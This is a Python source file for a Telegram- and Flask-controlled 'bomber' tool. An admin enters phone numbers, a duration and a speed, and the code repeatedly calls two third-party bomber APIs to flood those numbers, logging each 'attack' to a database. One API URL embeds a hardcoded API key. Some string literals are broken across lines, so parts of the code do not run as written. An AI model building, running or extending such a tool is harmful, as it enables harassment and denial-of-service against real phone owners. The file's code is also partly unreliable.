from flask import Flask, render_template, request, jsonify, send_from_directory
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, filters
import requests
import asyncio
import threading
import time
from datetime import datetime, timedelta
import os
import json
import plotly.graph_objects as go
import plotly.express as px
from plotly.subplots import make_subplots
import pandas as pd
import sqlite3

app = Flask(__name__, static_folder='static')

# Config
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))  # अपना Telegram user ID डालो
OWN_NUMBER = os.getenv("OWN_NUMBER", "")

# Bomber APIs
API1 = "https://boomberxnexu.vercel.app/api?number={}&country=91&count={}"
API2 = "https://ft-bomber.onrender.com/bomb?num={}&count={}&api_key=Sp5En6lWIppHZfg9yvY-R5eHtpd3fCEF"

# Global state
active_attacks = {}
attack_stats = []
db_conn = sqlite3.connect('attacks.db', check_same_thread=False)
db_conn.execute('''CREATE TABLE IF NOT EXISTS attacks 
                   (id TEXT, number TEXT, duration INT, requests INT, 
                    speed TEXT, status TEXT, timestamp DATETIME)''')

WAITING_NUMBER, WAITING_TIME, WAITING_MULTI = range(3)

# Speed modes
SPEED_MODES = {
    '1x': 0.5,
    '2x': 0.2, 
    '5x': 0.05
}

# Auto restart config
AUTO_RESTART = True
RESTART_DELAY = 10  # seconds

class AttackManager:
    @staticmethod
    def add_attack(attack_id, number, duration, speed='1x'):
        active_attacks[attack_id] = {
            'chat_id': None,
            'number': number,
            'duration': duration,
            'speed': speed,
            'start_time': datetime.now(),
            'total_requests': 0,
            'running': True,
            'status_msg_id': None,
            'restart_count': 0
        }
    
    @staticmethod
    def get_stats():
        return pd.DataFrame(attack_stats)

async def admin_panel(update: Update, context):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ **Admin only!**")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 DASHBOARD", callback_data="show_dashboard")],
        [InlineKeyboardButton("🚀 START BOMBER", callback_data="start_attack")],
        [InlineKeyboardButton("🔄 MULTI ATTACK", callback_data="multi_attack")],
        [InlineKeyboardButton("⚡ SPEED CONTROL", callback_data="speed_menu")],
        [InlineKeyboardButton("🔄 AUTO RESTART", callback_data="toggle_restart")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎛️ **ADMIN PANEL** 🎛️

"
        f"📱 Active: {len([a for a in active_attacks.values() if a['running']])}
"
        f"💾 Total Attacks: {len(attack_stats)}",
        reply_markup=reply_markup, parse_mode='Markdown'
    )

async def show_dashboard(update: Update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    
    # Generate live chart
    df = AttackManager.get_stats()
    if not df.empty:
        fig = px.bar(df.tail(10), x='timestamp', y='requests', 
                    title='Last 10 Attacks')
        chart_path = 'static/attacks.png'
        fig.write_image(chart_path)
        
        await update.message.reply_photo(
            photo=open(chart_path, 'rb'),
            caption=f"📊 **Live Dashboard**
Active: {len(active_attacks)}"
        )
    else:
        await update.message.reply_text("📊 No data yet")

# Speed control menu
async def speed_menu_callback(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("🐌 1x (Normal)", callback_data="speed_1x")],
        [InlineKeyboardButton("⚡ 2x (Fast)", callback_data="speed_2x")],
        [InlineKeyboardButton("🚀 5x (Turbo)", callback_data="speed_5x")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        "⚡ **Speed Control**
Choose attack speed:",
        reply_markup=reply_markup
    )

# Multi number attack
async def multi_attack_callback(update: Update, context):
    await update.callback_query.edit_message_text(
        "🔄 **Multi Number**
"
        "Enter numbers separated by comma:
"
        "`9876543210,1234567890`",
        parse_mode='Markdown'
    )
    return WAITING_MULTI

# Attack logic (enhanced with all features)
def run_enhanced_attack(attack_id, numbers, duration, speed_mode='1x'):
    delay = SPEED_MODES.get(speed_mode, 0.5)
    apis = [API1, API2]
    
    end_time = datetime.now() + timedelta(minutes=duration)
    
    while datetime.now() < end_time and active_attacks[attack_id]['running']:
        for number in numbers:
            for api_template in apis:
                try:
                    api_url = api_template.format(number, 10)
                    r = requests.get(api_url, timeout=5)
                    active_attacks[attack_id]['total_requests'] += 1
                except:
                    pass
        
        time.sleep(delay)
        
        # Auto restart logic
        if active_attacks[attack_id].get('restart_count', 0) < 3:
            active_attacks[attack_id]['restart_count'] += 1
    
    # Log to DB
    db_conn.execute(
        "INSERT INTO attacks VALUES (?, ?, ?, ?, ?, ?, ?)",
        (attack_id, ','.join(numbers), duration, active_attacks[attack_id]['total_requests'],
         speed_mode, 'completed', datetime.now())
    )
    db_conn.commit()

# Web admin panel
@app.route('/admin')
def admin_dashboard():
    stats = AttackManager.get_stats()
    active_count = len([a for a in active_attacks.values() if a['running']])
    return render_template('admin_panel.html', stats=stats, active=active_count)

# Static files
@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)

# Telegram webhook
@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
def webhook():
    update = Update.de_json(request.get_json(force=True), application.bot)
    asyncio.create_task(application.process_update(update))
    return 'OK'

if __name__ == '__main__':
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Add all handlers...
    application.add_handler(CommandHandler('admin', admin_panel))
    
    app.application = application
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
